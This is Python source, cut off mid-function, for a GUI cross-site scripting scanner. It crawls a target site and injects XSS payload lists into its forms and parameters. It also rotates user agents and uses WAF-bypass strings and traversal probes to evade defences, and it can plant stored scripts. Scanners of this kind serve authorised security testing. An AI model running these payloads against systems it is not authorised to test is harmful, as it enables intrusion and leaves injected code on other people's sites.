import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk, filedialog
import requests
from urllib.parse import urlparse, urlencode, parse_qs, quote, urljoin
from bs4 import BeautifulSoup
import threading
import queue
import os
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import json
from lxml import etree
import re
import heapq
import random
import xml.etree.ElementTree as ET
from selenium.webdriver.common.action_chains import ActionChains

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class PriorityQueueItem:
    def __init__(self, priority, url, depth):
        self.priority = priority
        self.url = url
        self.depth = depth

    def __lt__(self, other):
        return self.priority > other.priority  # Max-heap behavior for higher priority first

class ScannerEngine:
    def __init__(self, gui):
        self.gui = gui
        self.stop_scan_flag = False
        self.pause_scan_flag = False
        self.crawled_urls = set()
        self.crawled_urls_lock = threading.Lock()
        self.priority_queue_lock = threading.Lock()  # New lock for priority queue
        self.injection_points = queue.Queue()
        self.vulnerable_findings = []
        self.driver = None
        self.waf_detected = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36"
        ]
        self.contextual_payloads = {
            'html_tag': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                "<body onload=alert(1)>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>"
            ],
            'attribute': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onfocus=alert('XSS') autofocus ",
                "javascript:alert('XSS')",
                " onmouseover=alert(1)",
                " onload=alert(1)"
            ],
            'script_tag': [
                ";alert('XSS');//",
                "+alert('XSS')+",
                "');alert('XSS')",
                "};alert('XSS');//"
            ],
            'plain_text': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<details ontoggle=alert(1) open>"
            ]
        }
        self.bypass_payloads = [
            "<sCrIpT>alert('XSS')</sCrIpT>",
            "<img%20src=x%20onerror=alert('XSS')>",
            "<svg%20onload=alert('XSS')>",
            "<img hrEF=\"x\" sRC=\"data:x,\" oNLy=1 oNErrOR=prompt`1`>",
            "<ScRiPt>prompt('XSS')</ScRiPt>",
            "<detai%6Cs open ontoggle=alert('XSS')>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<xss onafterscriptexecute=alert(1)><script>1</script>",
            "<body onbeforeprint=console.log(1)>",
            "<xss onbeforescriptexecute=alert(1)><script>1</script>"
        ]

    def initialize_driver(self, headless=True, proxy=None):
        try:
            chrome_options = ChromeOptions()
            if headless:
                chrome_options.add_argument("--headless")
            chrome_options.add_argument("--log-level=3")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--disable-software-rasterizer")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--enable-logging")
            chrome_options.add_argument("--v=1")
            chrome_options.add_argument("--enable-automation")
            if proxy:
                chrome_options.add_argument(f'--proxy-server={proxy}')
            chrome_options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
            service = ChromeService(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.execute_script("""
                window.xss_triggered = false;
                window.alert = function() { window.xss_triggered = true; };
                window.prompt = function() { window.xss_triggered = true; };
                window.confirm = function() { window.xss_triggered = true; };
            """)
            logging.info("WebDriver initialized successfully.")
        except Exception as e:
            logging.error(f"Error initializing WebDriver: {e}")
            self.gui.queue_message(f"\n[!!!] Error initializing WebDriver: {e}\n")
            raise

    def wait_for_page_load(self, timeout=10):
        try:
            WebDriverWait(self.driver, timeout).until(
                lambda d: d.execute_script('return document.readyState') == 'complete'
            )
        except TimeoutException:
            logging.warning("Timeout waiting for page to load.")
            self.gui.queue_message("Timeout waiting for page to load.\n")

    def detect_waf(self, target_url, custom_headers, custom_cookies):
        try:
            test_payloads = [
                "<script>alert(1)</script>",
                "' OR '1'='1",
                "../etc/passwd",
                "<!--#exec cmd=\"ls\"-->"
            ]
            waf_signatures = {
                "Cloudflare": ["cloudflare", "cf-ray"],
                "AWS WAF": ["aws-waf-token"],
                "Imperva": ["incapsula"],
                "Akamai": ["akamai"],
                "ModSecurity": ["Mod_Security", "NOYB"]
            }
            for payload in test_payloads:
                test_url = f"{target_url}?test={quote(payload)}"
                response = requests.get(test_url, headers=custom_headers, cookies=custom_cookies, timeout=5)
                if response.status_code in [403, 406, 429]:
                    self.waf_detected = True
                    self.gui.queue_message("WAF detected via status code. Using bypass payloads.\n")
                    return True
                for waf, signatures in waf_signatures.items():
                    if any(sig in str(response.headers).lower() or sig in response.text.lower() for sig in signatures):
                        self.waf_detected = True
                        self.gui.queue_message(f"{waf} WAF detected. Using bypass payloads.\n")
                        return True
            return False
        except Exception as e:
            logging.warning(f"WAF detection failed: {e}")
            return False

    def perform_login(self, login_url, username, password, username_selector, password_selector, submit_selector, custom_headers, custom_cookies, scan_timeout):
        if not self.driver:
            self.initialize_driver()
        try:
            self.driver.get(login_url)
            self.wait_for_page_load(scan_timeout)
            wait = WebDriverWait(self.driver, scan_timeout)
            username_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, username_selector)))
            password_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, password_selector)))
            username_field.send_keys(username)
            password_field.send_keys(password)
            if submit_selector:
                submit_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, submit_selector)))
                submit_button.click()
            else:
                password_field.send_keys(Keys.RETURN)
            self.wait_for_page_load(scan_timeout)
            for cookie in self.driver.get_cookies():
                custom_cookies[cookie['name']] = cookie['value']
            self.gui.queue_message("Login successful.\n")
        except Exception as e:
            self.gui.queue_message(f"Login failed: {e}\n")
            logging.error(f"Login error: {e}")

    def crawl_and_scan(self, start_url, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, payloads, max_depth, blacklist, proxy, stored_phase=1):
        if not self.driver:
            self.initialize_driver(proxy=proxy)
        urls_to_crawl = []  # For priority queue
        heapq.heappush(urls_to_crawl, PriorityQueueItem(100, start_url, 0))  # High priority for start
        with self.crawled_urls_lock:
            self.crawled_urls.add(start_url)

        # Fetch and parse sitemap for initial URLs
        self.fetch_sitemap(start_url, urls_to_crawl, max_depth, target_domain, blacklist)

        def crawler_worker():
            while urls_to_crawl and not self.pause_scan_flag:
                if self.stop_scan_flag:
                    self.gui.queue_message("Crawler worker stopping...\n")
                    break
                try:
                    with self.priority_queue_lock:
                        item = heapq.heappop(urls_to_crawl)
                    url = item.url
                    depth = item.depth
                    with self.crawled_urls_lock:
                        if url in self.crawled_urls:
                            continue
                        self.crawled_urls.add(url)

                    if depth > max_depth or any(b in url for b in blacklist):
                        continue

                    # Rate limiting and stealth
                    time.sleep(random.uniform(1, 3))
                    custom_headers['User-Agent'] = random.choice(self.user_agents)

                    self.gui.queue_message(f"Crawling (depth {depth}, priority {item.priority}): {url}\n")
                    logging.info(f"Crawling (depth {depth}, priority {item.priority}): {url}")
                    self.driver.get(url)
                    self.wait_for_page_load(scan_timeout)
                    response_text = self.driver.page_source

                    # Event-driven crawling: Simulate interactions
                    self.simulate_interactions()

                    # Discover API endpoints
                    self.discover_apis(urls_to_crawl, depth, target_domain)

                    if stored_phase == 2:
                        xss_triggered = self.driver.execute_script("return window.xss_triggered;")
                        if xss_triggered:
                            self.vulnerable_findings.append({
                                "type": "Stored XSS",
                                "url": url,
                                "details": "Stored XSS triggered during re-crawl."
                            })
                            self.gui.queue_message(f"[VULNERABLE] Stored XSS found at {url}\n")

                    self._process_url_for_injection_points(url, custom_headers, custom_cookies, scan_timeout, target_domain, response_text=response_text)

                    soup = BeautifulSoup(response_text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        if self.stop_scan_flag or self.pause_scan_flag: break
                        href = link['href']
                        absolute_url = urljoin(url, href)
                        parsed_absolute = urlparse(absolute_url)
                        if parsed_absolute.netloc == target_domain:
                            with self.crawled_urls_lock:
                                if absolute_url not in self.crawled_urls:
                                    priority = self.calculate_priority(absolute_url)
                                    with self.priority_queue_lock:
                                        heapq.heappush(urls_to_crawl, PriorityQueueItem(priority, absolute_url, depth + 1))
                except Exception as e:
                    self.gui.queue_message(f"    [!] Unexpected error in crawler worker: {e}\n")
                    logging.exception(f"Unexpected error in crawler worker:")

        with ThreadPoolExecutor(max_workers=min(num_threads, 5)) as executor:
            futures = [executor.submit(crawler_worker) for _ in range(min(num_threads, 5))]
            for future in as_completed(futures):
                future.result()

        if not self.stop_scan_flag and not self.pause_scan_flag:
            self.gui.queue_message("\n--- Crawling Finished. Starting Scan of Discovered Injection Points ---\n")
            logging.info("Crawling finished. Starting scan.")
            self.scan_injection_points(payloads, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, proxy)

    def fetch_sitemap(self, start_url, urls_to_crawl, max_depth, target_domain, blacklist):
        def parse_sitemap(url):
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    root = ET.fromstring(response.content)
                    for elem in root.iter('{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):
                        s_url = elem.text
                        parsed = urlparse(s_url)
                        if parsed.netloc == target_domain and all(b not in s_url for b in blacklist):
                            priority = self.calculate_priority(s_url)
                            with self.priority_queue_lock:
                                heapq.heappush(urls_to_crawl, PriorityQueueItem(priority, s_url, 0))
                    for sitemap_elem in root.iter('{http://www.sitemaps.org/schemas/sitemap/0.9}sitemap'):
                        child_sitemap = sitemap_elem.find('{http://www.sitemaps.org/schemas/sitemap/0.9}loc').text
                        parse_sitemap(child_sitemap)
                    self.gui.queue_message("Sitemap parsed and URLs added to queue.\n")
            except Exception as e:
                logging.warning(f"Sitemap fetch failed for {url}: {e}")

        parse_sitemap(urljoin(start_url, 'sitemap.xml'))

    def simulate_interactions(self):
        try:
            clickable_elements = self.driver.find_elements(By.TAG_NAME, 'button') + self.driver.find_elements(By.CSS_SELECTOR, 'a[onclick], div[onclick]')
            for element in clickable_elements[:5]:  # Limit to avoid infinite loops
                try:
                    ActionChains(self.driver).move_to_element(element).click(element).perform()
                    time.sleep(1)
                    self.wait_for_page_load(5)
                except:
                    pass
        except Exception as e:
            logging.warning(f"Interaction simulation failed: {e}")

    def discover_apis(self, urls_to_crawl, depth, target_domain):
        try:
            logs = self.driver.get_log('performance')
            for entry in logs:
                log = json.loads(entry['message'])['message']
                if log['method'] == 'Network.responseReceived' and 'json' in log['params'].get('response', {}).get('mimeType', ''):
                    url = log['params']['response']['url']
                    with self.crawled_urls_lock:
                        if url not in self.crawled_urls and urlparse(url).netloc == target_domain:
                            priority = 80  # High for APIs
                            with self.priority_queue_lock:
                                heapq.heappush(urls_to_crawl, PriorityQueueItem(priority, url, depth + 1))
        except Exception as e:
            logging.warning(f"API discovery failed: {e}")

    def calculate_priority(self, url):
        priority = 0
        if '?' in url:
            priority += 50  # Has params
        if 'id' in url or 'search' in url:
            priority += 30  # Likely vulnerable
        return priority

    def _process_url_for_injection_points(self, url, custom_headers, custom_cookies, scan_timeout, target_domain, response_text=None):
        if self.stop_scan_flag or self.pause_scan_flag: return
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if query_params:
            self.gui.queue_message(f"  Found URL parameters for GET on {url}\n")
            self.injection_points.put({
                "type": "URL Parameter",
                "method": "GET",
                "url": url,
                "parameters": query_params.copy()
            })

        if response_text is None:
            if self.stop_scan_flag or self.pause_scan_flag: return
            try:
                self.driver.get(url)
            except Exception as e:
                self.gui.queue_message(f"    [!] Error loading page with driver: {e}. Re-initializing driver...\n")
                if self.driver:
                    self.driver.quit()
                self.driver = None
                self.initialize_driver()
                self.driver.get(url)
            self.wait_for_page_load(scan_timeout)
            response_text = self.driver.page_source

        if self.stop_scan_flag or self.pause_scan_flag: return
        soup = BeautifulSoup(response_text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            if self.stop_scan_flag or self.pause_scan_flag: return
            form_method = form.get('method', 'GET').upper()
            form_action = form.get('action', '')
            form_url = urljoin(url, form_action)
            if urlparse(form_url).netloc != target_domain:
                continue
            form_params = {}
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                if self.stop_scan_flag or self.pause_scan_flag: return
                input_name = input_tag.get('name')
                if input_name:
                    form_params[input_name] = [input_tag.get('value', '')]
            if form_params:
                self.gui.queue_message(f"  Found form ({form_method}) with parameters on {url}\n")
                self.injection_points.put({
                    "type": "Form",
                    "method": form_method,
                    "url": form_url,
                    "parameters": form_params.copy()
                })

    def determine_context(self, url, param_name, custom_headers, custom_cookies, method, parameters, proxy, probe='UNIQUE_PROBE_123'):
        test_params = parameters.copy()
        test_params[param_name] = [probe]
        test_url = url if method == "POST" else f"{urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()}"
        data = test_params if method == "POST" else None
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        response = requests.post(test_url, data=data, headers=custom_headers, cookies=custom_cookies, timeout=10, proxies=proxies) if method == "POST" else requests.get(test_url, headers=custom_headers, cookies=custom_cookies, timeout=10, proxies=proxies)
        soup = BeautifulSoup(response.text, 'html.parser')
        for element in soup.find_all(string=re.compile(re.escape(probe))):
            if element.parent.name == 'script':
                return 'script_tag'
            elif probe in str(element):
                return 'html_tag'
        for element in soup.find_all(True):
            for attr, value in element.attrs.items():
                if isinstance(value, str) and probe in value:
                    return 'attribute'
        return 'plain_text'

    def scan_injection_points(self, payloads, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, proxy):
        if self.stop_scan_flag or self.pause_scan_flag:
            self.gui.queue_message("Scan of injection points skipped due to stop signal.\n")
            return
        initial_count = self.injection_points.qsize()
        self.gui.queue_message(f"Starting scan of {initial_count} discovered injection points using {num_threads} threads...\n")
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            injection_points_list = []
            while not self.injection_points.empty():
                injection_points_list.append(self.injection_points.get())
            for injection_point in injection_points_list:
                if self.stop_scan_flag or self.pause_scan_flag: break
                futures.append(executor.submit(self._test_injection_point, injection_point, payloads, custom_headers, custom_cookies, scan_timeout, target_domain, proxy))
            for future in as_completed(futures):
                if self.stop_scan_flag or self.pause_scan_flag: break
                try:
                    findings = future.result()
                    if findings:
                        for finding in findings:
                            if not any(f['payload'] == finding['payload'] and f.get('parameter') == finding.get('parameter') and f['url'] == finding['url'] for f in self.vulnerable_findings):
                                self.vulnerable_findings.append(finding)
                                self.gui.master.after(0, lambda: self.gui.vulnerable_count_label.config(text=f"Vulnerable Findings: {len(self.vulnerable_findings)}"))
                                self.gui.queue_message(f"      [VULNERABLE] Potential XSS found: {finding.get('details', 'No details')}\n")
                                logging.info(f"Vulnerable: {finding}")
                except Exception as exc:
                    self.gui.queue_message(f"    [!] Task generated an exception during scanning: {exc}\n")
                    logging.error(f"Task exception during scanning: {exc}")
        if self.stop_scan_flag:
            self.gui.queue_message("\n--- Injection Point Scan Stopped ---\n")
            logging.info("Injection point scan stopped by user.")
        else:
            self.gui.queue_message("\n--- Injection Point Scan Finished ---\n")

    def _test_injection_point(self, injection_point, payloads, custom_headers, custom_cookies, scan_timeout, target_domain, proxy):
        if self.stop_scan_flag or self.pause_scan_flag: return []
        findings = []
        point_type = injection_point["type"]
        method = injection_point["method"]
        url = injection_point["url"]
        parameters = injection_point["parameters"]
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        for param_name in parameters:
            if self.stop_scan_flag or self.pause_scan_flag: break
            context = self.determine_context(url, param_name, custom_headers, custom_cookies, method, parameters, proxy)
            context_payloads = self.contextual_payloads.get(context, payloads)
            if self.waf_detected:
                context_payloads = self.bypass_payloads
            for payload in context_payloads:
                if self.stop_scan_flag or self.pause_scan_flag: break
                test_params = parameters.copy()
                test_params[param_name] = [payload]
                test_url = url if method == "POST" else f"{urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()}"
                data = test_params if method == "POST" else None
                try:
                    response = requests.post(test_url, data=data, headers=custom_headers, cookies=custom_cookies, timeout=scan_timeout, proxies=proxies) if method == "POST" else requests.get(test_url, headers=custom_headers, cookies=custom_cookies, timeout=scan_timeout, proxies=proxies)
                    response.raise_for_status()
                    if urlparse(response.url).netloc != target_domain:
                        continue
                    # Hybrid initial check
                    if payload in response.text:
                        # Confirm with Selenium
                        self.driver.execute_script("window.xss_triggered = false;")
                        self.driver.get(response.url)
                        self.wait_for_page_load(scan_timeout)
                        xss_triggered = self.driver.execute_script("return window.xss_triggered;")
                        if xss_triggered:
                            finding = {
                                "type": point_type,
                                "parameter": param_name,
                                "payload": payload,
                                "url": response.url,
                                "method": method,
                                "details": f"Payload '{payload}' executed in browser for parameter '{param_name}' (context: {context})",
                                "request": response.request.body or response.request.url,
                                "response_snippet": response.text[:200]
                            }
                            findings.append(finding)
                except Exception as e:
                    logging.exception(f"Error testing injection point: {e}")
        return findings

    def scan_dom(self, target_url, dom_selector, payloads, custom_headers, custom_cookies, scan_timeout, proxy):
        if not self.driver:
            self.initialize_driver(proxy=proxy)
        for payload in payloads:
            if self.stop_scan_flag or self.pause_scan_flag: break
            self.gui.queue_message(f"Testing DOM with payload: {payload}\n")
            try:
                self.driver.execute_script("window.xss_triggered = false;")
                self.driver.get(target_url)
                self.wait_for_page_load(scan_timeout)
                wait = WebDriverWait(self.driver, scan_timeout)
                element = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, dom_selector)))
                element.clear()
                element.send_keys(payload)
                element.send_keys(Keys.TAB)
                self.driver.execute_script("arguments[0].dispatchEvent(new Event('change'));", element)
                self.driver.execute_script("arguments[0].dispatchEvent(new Event('input'));", element)
                self.wait_for_page_load(scan_timeout)
                xss_triggered = self.driver.execute_script("return window.xss_triggered;")
                if xss_triggered:
                    finding = {
                        "type": "DOM",
                        "element_selector": dom_selector,
                        "payload": payload,
                        "url": self.driver.current_url,
                        "method": "DOM (Selenium)",
                        "details": f"Payload '{payload}' triggered XSS execution in DOM."
                    }
                    if not any(f['payload'] == finding['payload'] and f.get('element_selector') == finding.get('element_selector') for f in self.vulnerable_findings):
                        self.vulnerable_findings.append(finding)
                        self.gui.master.after(0, lambda: self.gui.vulnerable_count_label.config(text=f"Vulnerable Findings: {len(self.vulnerable_findings)}"))
                    self.gui.queue_message(f"      [VULNERABLE] Potential DOM XSS found with payload: {payload}\n")
            except NoSuchElementException:
                self.gui.queue_message(f"    [!] Element '{dom_selector}' not found on page. Skipping payload.\n")
            except Exception as e:
                self.gui.queue_message(f"    [!] Error during DOM test: {e}\n")
        if self.driver:
            self.driver.quit()

    def scan_stored_xss(self, start_url, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, payloads, max_depth, blacklist, proxy):
        # Phase 1: Inject
        unique_payloads = [f"<script>alert('{str(hash(payload))}')</script>" for payload in payloads]  # Unique
        self.crawl_and_scan(start_url, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, unique_payloads, max_depth, blacklist, proxy, stored_phase=1)
        # Phase 2: Re-crawl to check
        self.crawled_urls = set()
        self.crawl_and_scan(start_url, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, [], max_depth, blacklist, proxy, stored_phase=2)

    def serialize_state(self, file_path):
        state = {
            "crawled_urls": list(self.crawled_urls),
            "injection_points": list(self.injection_points.queue),
            "vulnerable_findings": self.vulnerable_findings
        }
        with open(file_path, 'w', encoding="utf-8") as f:
            json.dump(state, f, indent=4)

    def load_state(self, file_path):
        with open(file_path, 'r', encoding="utf-8") as f:
            state = json.load(f)
        self.crawled_urls = set(state["crawled_urls"])
        self.injection_points = queue.Queue()
        for point in state["injection_points"]:
            self.injection_points.put(point)
        self.vulnerable_findings = state["vulnerable_findings"]

class XSSScannerGUI:
    def __init__(self, master):
        self.master = master
        master.title("XSS Scanner (Ultimate)")

        # Configuration Frame
        config_frame = tk.LabelFrame(master, text="Configuration")
        config_frame.grid(row=0, column=0, columnspan=8, padx=5, pady=5, sticky="nw")

        self.label = tk.Label(config_frame, text="Target URL:")
        self.label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.url_entry = tk.Entry(config_frame, width=50)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5)

        self.scan_type_label = tk.Label(config_frame, text="Scan Type:")
        self.scan_type_label.grid(row=0, column=2, padx=5, pady=5, sticky="w")
        self.scan_type_var = tk.StringVar(value="Crawl and Scan")
        self.scan_type_options = ["Crawl and Scan", "Scan Single URL (GET/POST)", "Scan Single URL (DOM)", "Stored XSS Scan"]
        self.scan_type_menu = ttk.Combobox(config_frame, textvariable=self.scan_type_var, values=self.scan_type_options, state="readonly", width=20)
        self.scan_type_menu.grid(row=0, column=3, padx=5, pady=5)
        self.scan_type_menu.bind("<<ComboboxSelected>>", self.on_scan_type_select)

        self.scan_button = tk.Button(config_frame, text="Start Scan", command=self.start_scan)
        self.scan_button.grid(row=0, column=4, padx=5, pady=5)

        self.stop_button = tk.Button(config_frame, text="Stop Scan", command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=5, padx=5, pady=5)

        self.dom_input_label = tk.Label(config_frame, text="DOM Element Selector:")
        self.dom_input_entry = tk.Entry(config_frame, width=30)
        self.dom_input_label.grid_forget()
        self.dom_input_entry.grid_forget()

        self.timeout_label = tk.Label(config_frame, text="Timeout (s):")
        self.timeout_label.grid(row=1, column=2, padx=5, pady=5, sticky="w")
        self.timeout_var = tk.StringVar(value="10")
        self.timeout_entry = tk.Entry(config_frame, width=5, textvariable=self.timeout_var)
        self.timeout_entry.grid(row=1, column=3, padx=5, pady=5, sticky="w")

        self.threads_label = tk.Label(config_frame, text="Threads:")
        self.threads_label.grid(row=1, column=4, padx=5, pady=5, sticky="w")
        self.threads_var = tk.StringVar(value="5")
        self.threads_entry = tk.Entry(config_frame, width=5, textvariable=self.threads_var)
        self.threads_entry.grid(row=1, column=5, padx=5, pady=5, sticky="w")

        self.max_depth_label = tk.Label(config_frame, text="Max Depth:")
        self.max_depth_label.grid(row=1, column=6, padx=5, pady=5, sticky="w")
        self.max_depth_var = tk.StringVar(value="3")
        self.max_depth_entry = tk.Entry(config_frame, width=5, textvariable=self.max_depth_var)
        self.max_depth_entry.grid(row=1, column=7, padx=5, pady=5, sticky="w")

        self.proxy_label = tk.Label(config_frame, text="Proxy:")
        self.proxy_label.grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.proxy_entry = tk.Entry(config_frame, width=30)
        self.proxy_entry.grid(row=2, column=1, padx=5, pady=5)

        # Authentication
        auth_frame = tk.LabelFrame(master, text="Authentication")
        auth_frame.grid(row=1, column=0, columnspan=8, padx=5, pady=5, sticky="ew")

        self.login_label = tk.Label(auth_frame, text="Login URL:")
        self.login_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.login_entry = tk.Entry(auth_frame, width=50)
        self.login_entry.pack(side=tk.LEFT, padx=5, pady=5)

        self.username_label = tk.Label(auth_frame, text="Username:")
        self.username_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.username_entry = tk.Entry(auth_frame, width=20)
        self.username_entry.pack(side=tk.LEFT, padx=5, pady=5)

        self.password_label = tk.Label(auth_frame, text="Password:")
        self.password_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.password_entry = tk.Entry(auth_frame, width=20, show="*")
        self.password_entry.pack(side=tk.LEFT, padx=5, pady=5)

        self.username_selector_label = tk.Label(auth_frame, text="Username Selector:")
        self.username_selector_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.username_selector_entry = tk.Entry(auth_frame, width=20)
        self.username_selector_entry.insert(0, 'input[name="username"]')
        self.username_selector_entry.pack(side=tk.LEFT, padx=5, pady=5)

        self.password_selector_label = tk.Label(auth_frame, text="Password Selector:")
        self.password_selector_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.password_selector_entry = tk.Entry(auth_frame, width=20)
        self.password_selector_entry.insert(0, 'input[name="password"]')
        self.password_selector_entry.pack(side=tk.LEFT, padx=5, pady=5)

        self.submit_selector_label = tk.Label(auth_frame, text="Submit Selector:")
        self.submit_selector_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.submit_selector_entry = tk.Entry(auth_frame, width=20)
        self.submit_selector_entry.insert(0, '')
        self.submit_selector_entry.pack(side=tk.LEFT, padx=5, pady=5)

        # Scope
        scope_frame = tk.LabelFrame(master, text="Scope")
        scope_frame.grid(row=2, column=0, columnspan=8, padx=5, pady=5, sticky="ew")

        self.blacklist_label = tk.Label(scope_frame, text="Blacklist (comma-separated):")
        self.blacklist_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.blacklist_entry = tk.Entry(scope_frame, width=50)
        self.blacklist_entry.pack(side=tk.LEFT, padx=5, pady=5)

        # Payloads
        payload_frame = tk.LabelFrame(master, text="Payloads")
        payload_frame.grid(row=3, column=0, columnspan=8, padx=5, pady=5, sticky="ew")

        self.load_payloads_button = tk.Button(payload_frame, text="Load Payloads from File", command=self.load_payloads_from_file)
        self.load_payloads_button.pack(side=tk.LEFT, padx=5, pady=5)

        self.payload_count_label = tk.Label(payload_frame, text="Loaded Payloads: 0")
        self.payload_count_label.pack(side=tk.LEFT, padx=5, pady=5)

        self.loaded_payloads = []

        self.update_payload_count_label()

        # Headers and Cookies
        headers_cookies_frame = tk.LabelFrame(master, text="Headers and Cookies")
        headers_cookies_frame.grid(row=4, column=0, columnspan=8, padx=5, pady=5, sticky="ew")

        self.headers_label = tk.Label(headers_cookies_frame, text="Headers (key: value per line):")
        self.headers_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.headers_text = scrolledtext.ScrolledText(headers_cookies_frame, height=4, width=40)
        self.headers_text.pack(side=tk.LEFT, padx=5, pady=5, fill=tk.BOTH, expand=True)

        self.cookies_label = tk.Label(headers_cookies_frame, text="Cookies (key=value per line):")
        self.cookies_label.pack(side=tk.LEFT, padx=5, pady=5)
        self.cookies_text = scrolledtext.ScrolledText(headers_cookies_frame, height=4, width=40)
        self.cookies_text.pack(side=tk.LEFT, padx=5, pady=5, fill=tk.BOTH, expand=True)

        # Results
        results_frame = tk.Frame(master)
        results_frame.grid(row=5, column=0, columnspan=8, padx=5, pady=5, sticky="nsew")
        master.grid_rowconfigure(5, weight=1)
        self.results_label = tk.Label(results_frame, text="Scan Results:")
        self.results_label.pack(side=tk.TOP, anchor="w", padx=5, pady=5)
        self.results_text = scrolledtext.ScrolledText(results_frame, wrap=tk.WORD)
        self.results_text.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Status
        status_report_frame = tk.Frame(master)
        status_report_frame.grid(row=6, column=0, columnspan=8, padx=5, pady=5, sticky="sw")

        self.status_label = tk.Label(status_report_frame, text="Status: Idle")
        self.status_label.pack(side=tk.LEFT, padx=5, pady=5)

        self.vulnerable_count_label = tk.Label(status_report_frame, text="Vulnerable Findings: 0")
        self.vulnerable_count_label.pack(side=tk.LEFT, padx=15, pady=5)

        self.save_report_button = tk.Button(status_report_frame, text="Save Report", command=self.save_report_menu, state=tk.DISABLED)
        self.save_report_button.pack(side=tk.RIGHT, padx=5, pady=5)

        self.pause_button = tk.Button(status_report_frame, text="Pause Scan", command=self.pause_scan, state=tk.DISABLED)
        self.pause_button.pack(side=tk.RIGHT, padx=5, pady=5)

        self.resume_button = tk.Button(status_report_frame, text="Resume Scan", command=self.resume_scan, state=tk.DISABLED)
        self.resume_button.pack(side=tk.RIGHT, padx=5, pady=5)

        # Profiles
        profile_frame = tk.Frame(master)
        profile_frame.grid(row=7, column=0, columnspan=8, padx=5, pady=5, sticky="sw")

        self.save_profile_button = tk.Button(profile_frame, text="Save Profile", command=self.save_profile)
        self.save_profile_button.pack(side=tk.LEFT, padx=5, pady=5)

        self.load_profile_button = tk.Button(profile_frame, text="Load Profile", command=self.load_profile)
        self.load_profile_button.pack(side=tk.LEFT, padx=5, pady=5)

        # Warning
        self.warning_label = tk.Label(master, text="WARNING: Use this tool responsibly and ONLY on systems you have explicit permission to test.", fg="red")
        self.warning_label.grid(row=8, column=0, columnspan=8, padx=5, pady=5, sticky="s")

        self.scan_queue = queue.Queue()
        self.scanning = False
        self.engine = ScannerEngine(self)

    def on_scan_type_select(self, event):
        selected_type = self.scan_type_var.get()
        if selected_type == "Scan Single URL (DOM)":
            self.dom_input_label.grid(row=1, column=0, padx=5, pady=5, sticky="w")
            self.dom_input_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
            self.max_depth_label.grid_forget()
            self.max_depth_entry.grid_forget()
        elif selected_type == "Crawl and Scan" or selected_type == "Stored XSS Scan":
            self.dom_input_label.grid_forget()
            self.dom_input_entry.grid_forget()
            self.max_depth_label.grid(row=1, column=6, padx=5, pady=5, sticky="w")
            self.max_depth_entry.grid(row=1, column=7, padx=5, pady=5, sticky="w")
        else:
